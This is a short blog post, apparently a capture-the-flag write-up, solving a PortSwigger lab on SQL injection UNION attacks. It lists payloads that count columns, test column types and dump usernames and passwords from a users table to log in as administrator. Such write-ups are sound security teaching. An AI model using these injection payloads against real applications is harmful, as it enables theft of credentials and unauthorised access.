---
layout: post
title: "SQLi UNION attack, retrieving data from other tables"
date: 2023-06-17
categories:
  - CTF
  - PortSwigger
tags:
  - SQLi
---

## Description

This [lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables){:target="_blank"} contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. 

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

## Steps

First, we determine that the number of columns is at least 2, as the injection below doesn't produce an error: `category=Gifts' ORDER BY 2--`

We can also figure out that both columns are Strings, as they don't generate errors when using: `category=Gifts' UNION SELECT 'a', 'a'--`

Knowing that we have a table named `users` with 2 columns, namely, `username` and `password`, let's perform a join on this table to list all the users: `category=Gifts' UNION SELECT username, password FROM users--`

Et voilà! The user `administrator` is returned with the password `u35dnobwat09aipkb3xn`.

<img src="https://jawad.ca/images/june2023/3.png">

lets try it out:

<img src="https://jawad.ca/images/june2023/4.png" >

and it's solved! 
